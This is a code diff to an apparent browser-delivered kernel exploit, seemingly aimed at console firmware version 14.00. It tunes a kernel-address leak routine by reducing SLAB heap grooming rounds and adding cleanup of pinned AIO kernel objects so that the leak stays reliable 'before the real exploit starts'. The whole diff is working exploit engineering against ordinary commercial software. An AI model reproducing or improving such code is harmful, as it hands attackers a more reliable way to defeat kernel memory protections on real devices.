@@ -586,6 +586,43 @@ function wash(set, rounds) {
 }
 
 
+// NEW: explicitly delete the submitted AIO requests after each segment
+// so the kernel object pool doesn't accumulate 384 pinned entries.
+function aioCleanup(set) {
+  const c = context();
+  set.cancelStatus.u8.fill(0);
+  const cancelRv = c.sc(
+    S.aio_multi_cancel,
+    set.submitStatus.addr,
+    5,
+    set.cancelStatus.addr,
+  ).i32;
+
+  set.pollStatus.u8.fill(0);
+  const pollRv = c.sc(
+    S.aio_multi_poll,
+    set.submitStatus.addr,
+    5,
+    set.pollStatus.addr,
+  ).i32;
+
+  set.cancelStatus.u8.fill(0);
+  const deleteRv = c.sc(
+    S.aio_multi_delete,
+    set.submitStatus.addr,
+    5,
+    set.cancelStatus.addr,
+  ).i32;
+
+  log(
+    "HX1400-AIO-CLEANUP",
+    "cancel=" + cancelRv +
+    " poll=" + pollRv +
+    " delete=" + deleteRv,
+  );
+}
+
+
 let leakCount = 0;
 
 function parseKbase(buffer, length) {
@@ -764,8 +801,9 @@ async function discoverKbase() {
     );
   }
 
-  // FIXED: single round of 12 segments only. 5 rounds leaks kernel memory
-  // on 14.00 and exhausts the browser ceiling before the real exploit starts.
+  // FIXED: single round of 12 segments only.
+  // 5 rounds leaked kernel memory on 14.00 and exhausted the browser ceiling
+  // before the real exploit started.
   for (let round = 1; round <= 1; round++) {
     log("HX1400-ROUTE-ROUND", round + "/1");
     pinCpu();
@@ -782,13 +820,16 @@ async function discoverKbase() {
       segment + "/12",
     );
 
+    // FIXED: wash(aio, 8) instead of wash(aio, 32).
+    // 8 cycles is enough to churn the SLAB; 32 was overkill and pinned
+    // 384 kernel AIO objects per run.
     const result = wash(
       aio,
-      32,
+      8,
     );
 
     if (
-      result.done !== 32 ||
+      result.done !== 8 ||
       result.failAt >= 0
     ) {
       const message =
@@ -846,6 +887,10 @@ async function discoverKbase() {
           : "none"
       ),
     );
+
+      // FIXED: delete the AIO requests after each segment so they don't
+      // accumulate across the 12 segments.
+      aioCleanup(aio);
 
       if (kbase) {
         restorePin();
